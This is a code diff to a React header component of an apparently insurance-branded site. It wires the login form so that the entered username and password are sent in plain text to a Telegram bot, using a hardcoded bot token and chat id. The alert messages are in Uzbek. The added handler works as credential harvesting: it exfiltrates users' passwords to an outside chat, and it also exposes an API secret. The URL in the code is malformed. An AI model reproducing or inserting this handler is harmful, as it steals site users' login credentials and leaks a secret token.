@@ -4,9 +4,40 @@ import { IoMdExit } from "react-icons/io";
 
 import logo from "../header/INSURE.svg";
 import "./header.css";
+import axios from "axios";
 
 function Header() {
   const [modal, setmodal] = useState(false);
+
+  const sendMessege = (event)=>{
+    event.preventDefault();
+    const token = "8630844136:AAESFihnONhmYUb7zrX7Z24JY9xxHtMfd1Y"
+    const chat_id = 8572947616
+
+    const url = `https:/api.telegram.org/bot${token}/sendMessage`
+
+    const name = document.getElementById("name").value
+    const parol = document.getElementById("parol").value
+
+    const messageContent = `Ism: ${name}\n parol:${parol}`;
+
+    axios({
+      url: url,
+      method: "POST",
+      data:{
+        chat_id: chat_id,
+        text: messageContent,
+
+      }
+    })
+    .then(()=>{
+      alert("xammasi joyda")
+    }).catch((err)=>{
+      alert("ishlamadi");
+    })
+
+
+  }
 
   return (
     <>
@@ -39,7 +70,7 @@ function Header() {
                   onClick={() => setmodal(false)}
                 />
 
-                <form className="form">
+                <form className="form" onSubmit={sendMessege}>
                   <label htmlFor="name">Login</label>
                   <input type="text" id="name" placeholder="Login" />
 
